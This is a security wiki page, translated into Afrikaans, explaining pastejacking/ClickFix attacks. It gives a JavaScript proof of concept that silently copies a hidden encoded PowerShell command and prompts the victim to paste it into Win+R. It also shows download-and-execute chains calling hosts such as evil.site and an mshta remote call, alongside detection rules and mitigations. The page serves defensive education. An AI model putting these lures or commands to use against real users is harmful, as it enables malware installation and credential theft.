# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige advies

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer en plak sonder om dit te ondersoek. 'n Kwaadwillige webblad (of enige JavaScript-ondersteunende konteks soos 'n Electron of Desktop-toepassing) plaas programmatig aanvaller-beheerde teks in die stelselskyfie. Slachtoffers word aangemoedig, normaalweg deur sorgvuldig saamgestelde sosiale ingenieursinstruksies, om **Win + R** (Hardeskyf dialoog), **Win + X** (Vinster Toegang / PowerShell), of 'n terminale te open en die skyfie-inhoud te *plak*, wat onmiddellik arbitrêre opdragte uitvoer.

Omdat **geen lêer afgelaai word nie en geen aanhangsel geopen word nie**, omseil die tegniek die meeste e-pos en webinhoud sekuriteitsbeheer wat aanhangsels, makros of direkte opdraguitvoering monitor. Die aanval is dus gewild in phishingveldtogte wat kommoditeits malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.

## JavaScript Bewys-van-Konsep
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Oudere veldtogte het `document.execCommand('copy')` gebruik, nu rely op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Die ClickFix / ClearFake Stroom

1. Gebruiker besoek 'n typosquatted of gecompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingeseerde **ClearFake** JavaScript roep 'n `unsecuredCopyToClipboard()` helper aan wat stilweg 'n Base64-gecodeerde PowerShell een-liner in die klembord stoor.
3. HTML instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` voer uit, wat 'n argief aflaai wat 'n wettige uitvoerbare lêer plus 'n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die loader dekripteer addisionele fases, spuit shellcode in en installeer volharding (bv. geskeduleerde taak) – uiteindelik die NetSupport RAT / Latrodectus / Lumma Stealer laat loop.

### Voorbeeld NetSupport RAT Ketting
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitieme Java WebStart) soek sy gids vir `msvcp140.dll`.
* Die kwaadwillige DLL los dinamies API's op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, dekripteer hulle met 'n rol XOR-sleutel `"https://google.com/"`, inspuit die finale shellcode en unzip **client32.exe** (NetSupport RAT) na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript aflaaier uit binne **cscript.exe**
3. Verkry 'n MSI payload → laat `libcef.dll` val langs 'n gesertifiseerde toepassing → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta** oproep begin 'n verborge PowerShell-skrip wat `PartyContinued.exe` aflaai, `Boat.pst` (CAB) onttrek, `AutoIt3.exe` herbou deur middel van `extrac32` & lêer-konkatenasie en laastens 'n `.a3x` skrip uitvoer wat blaaiers se akrediteer inligting na `sumeriavgv.digital` uitvoer.

## Opsporing & Jag

Blou-spanne kan klembord, proses-skepping en registrasie telemetrie kombineer om pastejacking misbruik te identifiseer:

* Windows Registrasie: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou 'n geskiedenis van **Win + R** opdragte – soek na ongewone Base64 / obfuscated inskrywings.
* Sekuriteit Gebeurtenis ID **4688** (Proses Skepping) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Gebeurtenis ID **4663** vir lêer skeppings onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers reg voor die verdagte 4688 gebeurtenis.
* EDR klembord sensors (indien beskikbaar) – korreleer `Clipboard Write` onmiddellik gevolg deur 'n nuwe PowerShell proses.

## Versagtings

1. Blaaier verharding – deaktiveer klembord skryf-toegang (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis 'n gebruikersgebaar.
2. Sekuriteitsbewustheid – leer gebruikers om *te tik* sensitiewe opdragte of dit eers in 'n teksredigeerder te plak.
3. PowerShell Beperkte Taal Modus / Uitvoeringsbeleid + Toepassing Beheer om arbitrêre een-liners te blokkeer.
4. Netwerkbeheer – blokkeer uitgaande versoeke na bekende pastejacking en malware C2 domeine.

## Verwante Truuks

* **Discord Uitnodiging Hijacking** misbruik dikwels dieselfde ClickFix benadering nadat dit gebruikers na 'n kwaadwillige bediener gelok het:
{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Verwysings

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)

{{#include ../../banners/hacktricks-training.md}}
